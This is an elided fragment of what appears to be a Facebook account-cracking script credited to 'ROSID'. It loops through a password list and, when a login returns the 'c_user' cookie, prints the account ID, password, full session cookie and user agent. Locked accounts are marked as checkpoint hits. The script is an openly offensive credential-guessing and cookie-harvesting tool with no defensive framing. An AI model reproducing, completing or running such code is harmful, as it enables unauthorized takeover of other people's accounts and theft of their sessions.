...
\033[1;37m[■]============================================
\033[1;37m[■] Author     : ROSID
\033[1;37m[■] GitHub     : Rosid
\033[1;37m[■] Team       : Ri
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ROSID-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;32mUa : '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m[ROSID-CP]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r%s[ROSID][%s/%s][OK=%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
